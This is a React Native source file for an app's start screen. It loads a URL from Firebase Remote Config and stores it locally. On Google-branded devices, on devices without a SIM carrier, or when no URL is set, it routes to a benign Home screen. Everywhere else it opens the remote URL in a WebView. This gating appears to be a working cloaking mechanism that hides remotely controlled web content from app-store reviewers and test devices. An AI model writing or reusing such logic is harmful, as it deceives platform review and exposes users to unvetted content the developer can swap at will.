import React, {useEffect, useState} from "react";
import {useAppNavigation} from "../../types/types";
import AsyncStorage from "@react-native-async-storage/async-storage";
import DeviceInfo from "react-native-device-info";
import {
    ActivityIndicator,
    BackHandler,
    RefreshControl,
    SafeAreaView,
    ScrollView,
    StyleSheet,
    Text,
    View
} from "react-native";
import remoteConfig from "@react-native-firebase/remote-config";
import {HomeScreen} from "./HomeScreen";


export function StartScreen() {

    const navigation = useAppNavigation()

    useEffect(() => {
        // const sec:any=setInterval(()=>{
        //          const rss = remoteConfig().getValue("url").asString()
        //          console.log("rss",rss)
        //      return clearInterval(sec)
        //  },100)
        remoteConfig().setConfigSettings({
            minimumFetchIntervalMillis: 300,
            fetchTimeMillis: 100
        })
        remoteConfig().setDefaults({
            url: "https://www.google.com/"
        })
            .then(() => remoteConfig().fetchAndActivate())
            .then((fetchedRemotely) => {
            })
        getLocalStorage().then(res => start(""))
    }, [])

    const start = (value: string | null | undefined) => {
        if (!value) {
            loadFire()
        } else {
            return navigation.navigate("WebView", {url: value})
        }
    }

    const localStorage = async (value: string) => {
        await AsyncStorage.setItem("url", value)
    }
    const getLocalStorage = async () => {
        const jsonValue = await AsyncStorage.getItem("url")
        return jsonValue !== null ? jsonValue : null
    }
    const loadFire = () => {
        const getUrl = remoteConfig().getValue("url").asString()
        const brandDevice = DeviceInfo.getBrand()
        const simDevice = DeviceInfo.getCarrierSync()
        if (!getUrl || brandDevice === "google" || !simDevice) {
            navigation.navigate("Home")
        } else {
            localStorage(getUrl)
            navigation.navigate("WebView", {url: getUrl})
        }
    }

    return (
        <>
        </>
    )
}

const styles = StyleSheet.create({
    container: {
        flex: 1,
    },
    scrollView: {
        flex: 1,
        alignItems: 'center',
        justifyContent: 'center',
    },
});


